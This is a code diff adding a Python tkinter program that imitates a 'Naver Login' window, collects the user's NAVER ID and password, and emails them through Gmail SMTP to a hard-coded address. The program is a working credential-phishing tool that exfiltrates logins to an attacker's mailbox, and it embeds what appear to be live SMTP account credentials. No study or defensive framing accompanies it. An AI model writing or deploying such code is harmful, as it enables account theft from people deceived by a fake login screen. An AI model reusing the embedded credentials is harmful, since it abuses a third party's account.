@@ -1,0 +1,77 @@
+from tkinter import*
+import tkinter as tk
+
+import smtplib, os
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+
+win = Tk()
+win.title("Naver Login")
+win.geometry("500x400")
+
+
+label3 = Label(win)
+label3.config(text = "당신의 NAVER 아이디와 비밀번호를 입력하세요")
+label3.pack()
+
+# id label
+label1 = Label(win)
+label1.config(text = "ID")
+label1.pack()
+
+# id 입력
+ent1 = Entry(win)
+ent1.pack()
+
+# pw label
+label2 = Label(win)
+label2.config(text = "PW")
+label2.pack()
+
+# pw 입력
+ent2 = Entry(win)
+ent2.config(show ="*")
+ent2.pack()
+
+# 로그인 btn
+btn = Button(win)
+btn.config(text = "Login")
+
+def login():
+    user_id = ent1.get()
+    user_pw = ent2.get()
+
+    print(user_id, user_pw)
+
+    smtp_user = 'holykim707@gmail.com'
+    smtp_password = 'puorvfxkyfksobie'
+    emails = ['holykim707@gmail.com']
+    server = 'smtp.gmail.com'
+    port = 587
+    for email in emails:
+        msg = MIMEMultipart("alternative")
+        msg ["Subject"] = 'NAVER USER가 입력한ID, PW입니다'
+        msg ["From"] = smtp_user
+        msg["To"] = email
+        msg .attach(
+        MIMEText (
+            "ID: "+user_id + "  PW: "+user_pw,
+            "입력한 id와 pw를 가져왔습니다"
+
+
+        )
+        )
+
+    s = smtplib .SMTP(server , port)
+    s .ehlo()
+    s .starttls()
+    s .login(smtp_user,smtp_password)
+    s .sendmail(smtp_user , email , msg .as_string())
+    s.quit()
+
+btn.config(command = login)
+btn.pack()
+
+win.mainloop()
